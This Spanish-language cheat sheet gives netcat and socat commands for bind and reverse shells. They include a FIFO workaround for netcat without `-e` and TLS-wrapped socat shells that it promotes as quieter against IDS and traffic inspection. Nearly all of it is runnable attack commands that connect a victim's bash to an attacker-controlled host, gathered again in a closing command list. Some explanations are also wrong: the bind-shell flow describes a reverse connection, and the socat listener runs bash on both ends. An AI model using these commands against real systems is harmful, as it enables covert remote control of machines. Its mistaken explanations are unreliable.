### I. **Resumen Operativo: Netcat como listener de bind/reverse shell**

---

#### A. **Bind Shell con Netcat (con `-e`)**

```bash
nc -lvnp <PORT> -e /bin/bash
```

**Funciona solo si netcat tiene soporte para `-e`**, como:

* `nc.exe` de Windows (`/usr/share/windows-resources/binaries/nc.exe` en Kali)
* `netcat-traditional` en Kali Linux

**Flujo:**

1. Atacante escucha (`-l`)
2. Víctima se conecta (TCP client)
3. Se ejecuta `/bin/bash` al conectar
4. Atacante obtiene shell interactivo

---

#### B. **Reverse Shell con Netcat (con `-e`)**

```bash
nc <ATACANTE_IP> <PORT> -e /bin/bash
```

**Flujo:**

1. Víctima inicia conexión TCP hacia atacante
2. Ejecuta bash al establecer la conexión
3. Atacante ya estaba escuchando con `nc -lvnp <PORT>`
4. Shell controlado remotamente

---

#### C. **Netcat sin `-e`: Shell con FIFO**

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

##### Desglose:

1. `mkfifo /tmp/f`: crea un **named pipe (FIFO)** en `/tmp/f`
2. `nc -lvnp <PORT> < /tmp/f`: netcat lee desde la tubería FIFO
3. `| /bin/sh > /tmp/f 2>&1`: lo que llega a netcat (stdin del atacante) se pasa a `/bin/sh`, cuyo stdout y stderr se redirigen de nuevo a la FIFO
4. `rm /tmp/f`: limpia el pipe después de uso

**Resultado**: al conectar, lo que escribe el atacante va a bash, y lo que bash responde vuelve al atacante. Circunvalación del flag `-e`.

---

### II. **SOCAT: Alternativa moderna y flexible**

---

#### A. **Listener de Reverse Shell con Socat**

**Atacante escucha en 443 y obtiene shell:**

```bash
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
```

#### B. **Víctima conecta:**

```bash
socat TCP:<ATACANTE_IP>:443 EXEC:/bin/bash
```

---

#### C. **Encrypted Shell con Socat (TLS)**

**Generar certificado en atacante:**

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
```

#### Listener (atacante):

```bash
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=cert.pem,key=key.pem EXEC:/bin/bash
```

#### Reverse Shell (víctima):

```bash
socat OPENSSL:<ATACANTE_IP>:443,verify=0 EXEC:/bin/bash
```

**Ventajas:**

* Encriptación TLS (dificulta inspección de tráfico)
* No requiere `-e`
* Más silencioso en entornos con IDS

---

### III. **Refuerzo conceptual previo**

---

| Tema                    | Resumen operativo                                                          |
| ----------------------- | -------------------------------------------------------------------------- |
| `nc -e`                 | Ejecuta un comando al recibir conexión, útil para bindshell y reverseshell |
| FIFO (mkfifo)           | Canal de comunicación unidireccional entre procesos (named pipe)           |
| `/bin/sh` o `/bin/bash` | Shell UNIX; permite ejecutar comandos                                      |
| `socat`                 | Herramienta para redirigir flujos de datos entre sockets, procesos, pipes  |
| TLS con socat           | Capa de cifrado que oculta el tráfico del shell                            |

---

### IV. **Glosario Técnico**

| Término                   | Definición                                                                          |
| ------------------------- | ----------------------------------------------------------------------------------- |
| **Bind Shell**            | La víctima escucha una conexión entrante; el atacante se conecta para obtener shell |
| **Reverse Shell**         | La víctima inicia la conexión saliente; el atacante recibe shell                    |
| **Named Pipe (FIFO)**     | Archivo especial usado para redirigir entrada/salida entre procesos                 |
| **`-e` (netcat)**         | Ejecuta un programa (como `/bin/bash`) cuando alguien se conecta                    |
| **`socat`**               | Utility para redirigir tráfico entre sockets, comandos, archivos                    |
| **`reuseaddr`**           | Permite reutilizar un puerto incluso si está en estado TIME\_WAIT                   |
| **`fork`**                | Crea múltiples instancias para manejar conexiones simultáneas                       |
| **`OPENSSL` (socat)**     | Establece conexión cifrada TLS                                                      |
| **`cert.pem`, `key.pem`** | Certificado y clave privada TLS para conexiones seguras                             |
| **`verify=0`**            | Desactiva validación del certificado (útil para pruebas o shells rápidos)           |

---

### V. **Resumen de Comandos Ejecutables**

```bash
# Reverse shell con netcat (si tiene -e)
nc <ATACANTE_IP> <PORT> -e /bin/bash

# Bind shell sin -e con named pipe
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# Listener socat sin cifrado
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Conexión reverse shell socat sin cifrado
socat TCP:<ATACANTE_IP>:4444 EXEC:/bin/bash

# Listener socat con cifrado
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=cert.pem,key=key.pem EXEC:/bin/bash

# Reverse shell socat con cifrado
socat OPENSSL:<ATACANTE_IP>:443,verify=0 EXEC:/bin/bash
```

---
